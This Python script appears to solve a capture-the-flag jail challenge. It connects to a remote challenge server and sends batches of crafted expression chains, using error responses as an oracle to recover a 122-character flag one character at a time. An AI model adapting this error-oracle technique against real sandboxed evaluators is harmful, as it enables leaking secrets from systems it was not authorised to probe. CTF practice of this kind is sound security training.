#!/usr/bin/env python3
import socket
import json
import string
import sys
import time

# Load embedded chains from solve_remote_live
import solve_remote_live
RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

class RemoteOracle:
    def __init__(self, host, port, timeout=60):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock.settimeout(timeout)
        self.buffer = b""
        self._read_until(b"expr: ")

    def _read_until(self, token):
        while token not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            self.buffer += chunk
        if token in self.buffer:
            parts = self.buffer.split(token, 1)
            self.buffer = parts[1]

    def query_batch(self, exprs):
        if not exprs:
            return []
        token_re = solve_remote_live.TOKEN_RE
        answers = []
        chunk_size = 16
        for offset in range(0, len(exprs), chunk_size):
            group = exprs[offset : offset + chunk_size]
            payload = ("\n".join(group) + "\n").encode()
            self.sock.sendall(payload)
            group_answers = []
            while len(group_answers) < len(group):
                matches = list(token_re.finditer(self.buffer))
                if matches:
                    take = min(len(matches), len(group) - len(group_answers))
                    group_answers.extend(m.group(1).decode() for m in matches[:take])
                    self.buffer = self.buffer[matches[take - 1].end() :]
                    if len(group_answers) == len(group):
                        break
                    continue
                chunk = self.sock.recv(65536)
                if not chunk:
                    raise EOFError("Remote closed connection")
                self.buffer += chunk
            answers.extend(group_answers)
        return answers

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

def main():
    host = "challs.pyjail.club"
    port = 20219
    print(f"[+] Connecting to {host}:{port}...")
    oracle = RemoteOracle(host, port)

    length = 122
    charset = string.ascii_lowercase + string.digits + "_{}"
    
    flag = ["?"] * length
    flag[0:5] = list("jail{")
    flag[-1] = "}"
    
    print(f"[+] Flag length: {length}")
    print(f"[+] Initial flag template: {''.join(flag)}")

    # We recover each position index from 0 to 121
    # For a position p (0-indexed) and char c (ord v), 
    # forward add is: p + v
    # reverse add is: (length - 1 - p) + v
    
    # We can query candidate characters for unknown positions
    unknown_positions = [i for i in range(length) if flag[i] == "?"]
    print(f"[*] Recovering {len(unknown_positions)} unknown characters...")

    for pos in unknown_positions:
        # Try candidates for pos
        candidates = [c for c in charset if c not in "{}"]
        exprs = []
        valid_c = []
        
        for c in candidates:
            v = ord(c)
            # Try forward value: pos + v
            val_fwd = pos + v
            if val_fwd in CHAINS:
                pred = predicate(CHAINS[val_fwd])
                expr = f"{solve_remote_live.BASE}|explode|tostream|flatten|add|{pred}|error"
                exprs.append(expr)
                valid_c.append((c, val_fwd, False))
                continue
            
            # Try reverse value: (length - 1 - pos) + v
            val_rev = (length - 1 - pos) + v
            if val_rev in CHAINS:
                pred = predicate(CHAINS[val_rev])
                expr = f"{solve_remote_live.BASE}|explode|reverse|implode|explode|tostream|flatten|add|{pred}|error"
                exprs.append(expr)
                valid_c.append((c, val_rev, True))
                continue

        if not exprs:
            print(f"[-] No valid chain for pos {pos}")
            continue

        answers = oracle.query_batch(exprs)
        matches = []
        for (c, val, is_rev), ans in zip(valid_c, answers):
            if ans == "error":
                matches.append(c)

        if len(matches) == 1:
            flag[pos] = matches[0]
            print(f"[+] pos {pos:3d}: {matches[0]} -> {''.join(flag)}", flush=True)
        elif len(matches) > 1:
            print(f"[!] pos {pos:3d}: multiple matches {matches}", flush=True)
        else:
            print(f"[-] pos {pos:3d}: no match found out of {len(candidates)} candidates", flush=True)

    oracle.close()
    print(f"\n[+] RECOVERED FLAG: {''.join(flag)}")

if __name__ == "__main__":
    main()
